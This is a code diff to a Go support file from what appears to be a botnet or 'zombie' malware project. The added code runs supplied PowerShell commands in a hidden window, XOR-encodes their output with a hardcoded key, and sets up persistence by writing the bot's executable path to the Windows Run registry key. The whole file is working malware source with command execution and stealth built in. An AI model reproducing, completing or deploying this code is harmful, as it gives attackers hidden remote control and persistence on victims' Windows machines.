@@ -1,39 +1,38 @@
-// +build ignore
-
 package zsupport
 
 import (
-	"syscall"
+	"bytes"
+	"fmt"
+	"github.com/UPSJustin/GoZombie/xor"
 	"golang.org/x/sys/windows/registry"
+	"os"
+	"os/exec"
+	"syscall"
 )
 
-func HideWindow(){
-SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-}
+func ExecWindows(output string) string {
+	key := "KCQ"
 
-func ExecWindows(output string){
+	cmd := exec.Command("powershell.exe", fmt.Sprintf(`%s`, output))
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 
- cmd := exec.Command("powershell.exe", fmt.Sprintf(`%s`, output)
-                               cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	cmdOutput := &bytes.Buffer{}
+	cmd.Stdout = cmdOutput
+	err := cmd.Run()
+	if err != nil {
+		os.Stderr.WriteString(err.Error())
+	}
 
-                                cmdOutput := &bytes.Buffer{}
-                                cmd.Stdout = cmdOutput
-                                err := cmd.Run()
-                                if err != nil {
-                                        os.Stderr.WriteString(err.Error())
-                                }
-
-                                encryptmsg := xor.EncryptDecrypt(string(cmdOutput.Bytes()), key)
-				return string(encryptmsg), nil
+	encryptmsg := xor.EncryptDecrypt(string(cmdOutput.Bytes()), key)
+	return string(encryptmsg)
 }
 
 func RegisterAutoRun(zombieName string, fullPathBotSourceExecFile string) error {
-        zsupport.OutMessage("Activated Persistence")
-        err := zsupport.WriteRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, zombieName, fullPathBotSourceExecFile)
-        zsupport.CheckError(err)
-        return err
+	OutMessage("Activated Persistence")
+	err := WriteRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, zombieName, fullPathBotSourceExecFile)
+	CheckError(err)
+	return err
 }
-
 
 func GetRegistryKey(typeReg registry.Key, regPath string, access uint32) (key registry.Key, err error) {
 	currentKey, err := registry.OpenKey(typeReg, regPath, access)
